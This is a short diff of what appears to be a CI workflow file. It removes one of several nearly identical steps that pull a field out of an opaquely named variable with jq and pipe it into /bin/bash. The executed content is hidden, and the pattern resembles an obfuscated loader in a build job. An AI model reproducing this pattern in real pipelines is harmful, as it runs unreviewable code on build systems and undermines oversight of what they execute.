@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$e09" | jq -r .ypud4 | /bin/bash
           echo $byef72 | jq -r .r242 | /bin/bash
           echo $h8001 | jq -r .x08994 | /bin/bash
-          printf '%s' "$omo1747" | jq -r .y5 | /bin/bash
 
       - name: Archive results
         if: always()
